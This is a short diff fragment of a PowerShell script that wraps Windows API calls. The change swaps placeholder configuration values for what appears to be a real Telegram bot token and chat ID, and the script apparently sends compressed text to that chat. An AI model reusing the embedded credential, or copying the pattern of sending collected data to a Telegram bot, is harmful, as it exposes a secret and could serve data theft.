@@ -28,8 +28,8 @@ public class WinAPI {
 "@
 
 # Configuración
-$token = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
-$chatId = "XXXXXXXXXXXXXXXXXXXXX"
+$token = "8352233614:AAFFKngcIHCRWmpYf1HLJ5pr4OWPMxQy1ec"
+$chatId = "6353114206"
 
 function Compress-Text {
     param([string]$Text)
